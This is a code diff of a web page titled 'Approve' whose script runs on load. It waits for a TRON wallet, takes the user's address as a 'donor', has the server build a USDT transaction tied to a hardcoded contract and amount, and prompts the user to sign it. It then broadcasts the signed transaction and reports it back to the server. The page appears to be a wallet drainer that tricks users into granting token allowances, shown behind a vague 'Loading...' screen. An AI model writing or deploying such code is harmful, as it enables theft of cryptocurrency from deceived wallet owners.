@@ -6,137 +6,103 @@
     <title>Approve</title>
 </head>
 <body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
-    <p id="status" style="font-size:16px;color:#9ca3af;">Connecting...</p>
-    <p id="debug" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>
+    <p id="msg1" style="font-size:16px;color:#9ca3af;">Loading...</p>
+    <p id="msg2" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>
 
     <script>
-        var CONTRACT_ADDRESS = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
-        var USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        var APPROVE_AMOUNT = 1000000;
-        var status = document.getElementById("status");
-        var debug = document.getElementById("debug");
-        var started = false;
+        var CONTRACT = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
+        var USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        var AMOUNT = 1000000;
+        var el1 = document.getElementById("msg1");
+        var el2 = document.getElementById("msg2");
 
-        // Wait for tronWeb to appear, then request access
-        var check = setInterval(function() {
-            if (window.tronWeb) {
-                clearInterval(check);
-                debug.textContent = "tronWeb found, requesting access...";
-                requestAccess();
-            }
-        }, 200);
-
-        setTimeout(function() {
-            if (!started) {
-                clearInterval(check);
-                status.textContent = "Wallet not detected";
-                status.style.color = "#f87171";
-            }
-        }, 20000);
-
-        function requestAccess() {
-            // Try tronLink.request first (Trust Wallet / TronLink standard)
-            if (window.tronLink && window.tronLink.request) {
-                window.tronLink.request({ method: "tron_requestAccounts" })
-                    .then(function(res) {
-                        debug.textContent = "Access granted: " + JSON.stringify(res);
-                        waitForAddress();
-                    })
-                    .catch(function(e) {
-                        debug.textContent = "Access denied: " + (e.message || e);
-                        status.textContent = "Please approve the connection";
-                        status.style.color = "#f87171";
-                    });
-            } else if (window.tronWeb.request) {
-                window.tronWeb.request({ method: "tron_requestAccounts" })
-                    .then(function(res) {
-                        debug.textContent = "Access granted via tronWeb";
-                        waitForAddress();
-                    })
-                    .catch(function(e) {
-                        debug.textContent = "Fallback: " + (e.message || e);
-                        waitForAddress();
-                    });
-            } else {
-                // No request method, just wait for address
-                debug.textContent = "No request method, waiting for address...";
-                waitForAddress();
-            }
+        function msg(a, b) {
+            el1.textContent = a;
+            if (b) el2.textContent = b;
         }
 
-        function waitForAddress() {
-            var addrCheck = setInterval(function() {
-                var tw = window.tronWeb;
-                var addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
-                if (addr && addr.length > 5 && addr !== "false") {
-                    clearInterval(addrCheck);
-                    if (!started) {
-                        started = true;
-                        debug.textContent = "Address: " + addr;
-                        sendApprove();
+        function run() {
+            try {
+                msg("Waiting for wallet...");
+                var n = 0;
+                var t = setInterval(function() {
+                    n++;
+                    try {
+                        var tw = window.tronWeb;
+                        if (!tw) { el2.textContent = "attempt " + n; return; }
+
+                        var addr = tw.defaultAddress && tw.defaultAddress.base58;
+                        if (!addr || addr === "false" || addr.length < 10) {
+                            el2.textContent = "tronWeb found, addr=" + addr + " attempt " + n;
+                            // Try requesting accounts
+                            if (n === 5 && window.tronLink && window.tronLink.request) {
+                                window.tronLink.request({ method: "tron_requestAccounts" }).catch(function(){});
+                            }
+                            return;
+                        }
+
+                        // GOT ADDRESS - proceed
+                        clearInterval(t);
+                        msg("Got wallet: " + addr.substring(0, 8) + "...", "Building transaction...");
+                        buildAndSign(addr);
+                    } catch(e) {
+                        el2.textContent = "poll error: " + e.message;
                     }
-                }
-            }, 200);
+                }, 300);
 
-            // Timeout for address
-            setTimeout(function() {
-                if (!started) {
-                    status.textContent = "Could not get wallet address";
-                    status.style.color = "#f87171";
-                    debug.textContent = "addr: " + (window.tronWeb.defaultAddress ? window.tronWeb.defaultAddress.base58 : "none");
-                }
-            }, 15000);
+                setTimeout(function() { clearInterval(t); }, 30000);
+            } catch(e) {
+                msg("Error", e.message);
+            }
         }
 
-        function sendApprove() {
-            var addr = window.tronWeb.defaultAddress.base58;
-            status.textContent = "Loading...";
-            status.style.color = "#facc15";
-            debug.textContent = "addr: " + addr;
-
-            // Delegate energy in background
-            fetch("/api/delegate-energy", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ donor: addr })
-            }).catch(function() {});
-
-            // Ask SERVER to build the transaction (no client-side network calls)
-            debug.textContent = "Building TX on server...";
+        function buildAndSign(addr) {
+            // Ask server to build TX
             fetch("/api/build-approve", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ donor: addr })
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({donor: addr})
             })
             .then(function(r) { return r.json(); })
             .then(function(data) {
-                if (data.error) throw new Error(data.error);
-                debug.textContent = "TX built. Requesting signature...";
-                status.textContent = "Confirm in wallet!";
-                // Only thing we need Trust Wallet to do: SIGN
-                return window.tronWeb.trx.sign(data.transaction);
-            })
-            .then(function(signedTx) {
-                debug.textContent = "Signed! Broadcasting...";
-                return window.tronWeb.trx.sendRawTransaction(signedTx);
-            })
-            .then(function(result) {
-                var txId = result.txid || result.transaction.txID;
-                status.textContent = "Done!";
-                status.style.color = "#4ade80";
-                debug.textContent = "TX: " + txId;
-                fetch("/api/approved", {
+                if (data.error) { msg("Server error", data.error); return; }
+                msg("Confirm in your wallet!", "Waiting for signature...");
+
+                // Delegate energy in background
+                fetch("/api/delegate-energy", {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ donor: addr, txId: txId })
-                }).catch(function() {});
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({donor: addr})
+                }).catch(function(){});
+
+                // ASK TRUST WALLET TO SIGN
+                window.tronWeb.trx.sign(data.transaction)
+                .then(function(signed) {
+                    msg("Broadcasting...", "Signed successfully");
+                    return window.tronWeb.trx.sendRawTransaction(signed);
+                })
+                .then(function(res) {
+                    var id = res.txid || (res.transaction && res.transaction.txID) || "unknown";
+                    msg("Success!", "TX: " + id);
+                    el1.style.color = "#4ade80";
+                    fetch("/api/approved", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({donor: addr, txId: id})
+                    }).catch(function(){});
+                })
+                .catch(function(e) {
+                    msg("Rejected", "sign error: " + (e.message || e));
+                    el1.style.color = "#f87171";
+                });
             })
-            .catch(function(err) {
-                status.textContent = "Error";
-                status.style.color = "#f87171";
-                debug.textContent = "ERR: " + (err.message || JSON.stringify(err));
+            .catch(function(e) {
+                msg("Network error", "fetch failed: " + (e.message || e));
+                el1.style.color = "#f87171";
             });
         }
+
+        run();
     </script>
 </body>
 </html>
